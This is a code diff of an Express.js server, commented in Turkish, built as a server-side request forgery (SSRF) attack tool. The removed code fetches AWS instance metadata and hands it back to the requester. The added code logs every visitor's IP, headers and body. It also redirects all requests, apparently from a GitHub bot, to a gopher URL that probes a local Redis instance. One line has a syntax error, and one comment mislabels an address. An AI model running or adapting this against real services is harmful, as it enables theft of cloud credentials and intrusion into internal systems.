@@ -1,49 +1,62 @@
 const express = require('express');
-const axios = require('axios'); // Axios modülü gereklidir (npm install axios)
 const app = express();
+const PORT = process.env.PORT || 3000;
 
+// Body parser middleware'leri
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// Gelen tüm istekleri detaylıca loglayan middleware
 app.use((req, res, next) => {
-    console.log(`\n[${new Date().toISOString()}] İstek Geldi: ${req.method} ${req.url}`);
-    console.log('User-Agent:', req.headers['user-agent']);
+    const timestamp = new Date().toISOString();
+    const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    console.log('\n' + '='.repeat(50));
+    console.log(`[${timestamp}] YENİ İSTEK YAKALANDI! 🚀`);
+    console.log('='.repeat(50));
+    console.log(`Method     : ${req.method}`);
+    console.log(`URL        : ${req.url}`);
+    console.log(`Real IP    : ${clientIp}`);
+    console.log(`User-Agent : ${req.headers['user-agent'] || 'Bilinmiyor'}`);
+    console.log('--- TÜM HEADERS ---');
+    console.log(JSON.stringify(req.headers, null, 2));
+    
+    if (Object.keys(req.query).length > 0) {
+        console.log('--- QUERY PARAMETRELERİ ---');
+        console.log(JSON.stringify(req.query, null, 2));
+    }
+    
+    if (req.body && Object.keys(req.body).length > 0) {
+        console.log('--- BODY ---');
+        console.log(JSON.stringify(req.body, null, 2));
+    }
+    console.log('-'.repeat(50));
+    
     next();
 });
 
-// Ana domain'e istek geldiğinde 302 yerine doğrudan metadata'yı fetch'le
-app.get('/', async (req, res) => {
-    // AWS / Cloud Metadata hedefi (veya alternatif ip'ler)
-    const metadataTarget = 'http://169.254.169.254/latest/meta-data/';
+// ==========================================
+// TEST ENDPOINTLERİ
+// ==========================================
+
+// 1. Ana Sayfa: GitHub botunu veya istekleri istediğin adrese fırlatmak için
+app.all('/', (req, res) => {
+    // Test etmek istediğin hedefi buraya yazabilirsin:
+    // Örn: Standart IP, Decimal IP, Hex IP veya Metadata / Gopher denemeleri
+    const targetUrl = 'gopher://127.0.0.1:6379/_INFO%0d%0a'; // 127.0.0.1 (Hex formatı)
     
-    console.log(`[!] Metadata hedefien sunucu üzerinden istek atılıyor: ${metadataTarget}`);
-
-    try {
-        // Sunucu kendi içinden/buluttan hedefe istek atıyor
-        const response = await axios.get(metadataTarget, {
-            timeout: 4000,
-            headers: {
-                // Bazı cloud servisleri IMDSv2 için token ister, v1 için bu yeterlidir
-                'X-aws-ec2-metadata-token-ttl-seconds': '21600' 
-            }
-        });
-
-        console.log("🔥 METADATA BAŞARIYLA ÇEKİLDİ! Yanıt:");
-        console.log(response.data);
-
-        // Elde edilen hassas veriyi hem terminale basıyoruz hem de isteği atana gösteriyoruz
-        return res.status(200).send(`Metadata Data:\n${JSON.stringify(response.data, null, 2)}`);
-
-    } catch (error) {
-        console.log(`[-] Metadata isteği başarısız oldu veya bu ortamda metadata yok: ${error.message}`);
-        
-        // Eğer Render üzerinde çalışıyorsan, Render kapalı bir bulut sunucu olduğu için 
-        // burası zaman aşımına (timeout) uğrayabilir veya hata dönebilir. 
-        // O yüzden yedek olarak 302 yönlendirmesini patlatabiliriz:
-        return res.redirect(302, 'http://2130706433'); 
-    }
+    console.log(`[!] Yönlendiriliyor ➔ Hedef: ${targetUrl}`);
+    
+    // 302 Found ile hedef adrese yönlendir
+    return res.redirect(302, targetUrl);
 });
 
-app.listen(3000, () => {
-    console.log("🚀 Metadata Avcısı 3000 portunda devrede!");
+// 2. Özel Yakalama Endpoint'i (Görsel veya dosya süsü vermek istersen)
+app.all('/yakalandi', (req, res) => {
+    res.status(200.send('<h1>Hedef başarıyla yakalandı ve loglandı!</h1>'));
+});
+
+// Sunucuyu başlat
+app.listen(PORT, () => {
+    console.log(`🔥 Lab sunucusu ${PORT} portunda aktif ve avını bekliyor...`);
 });
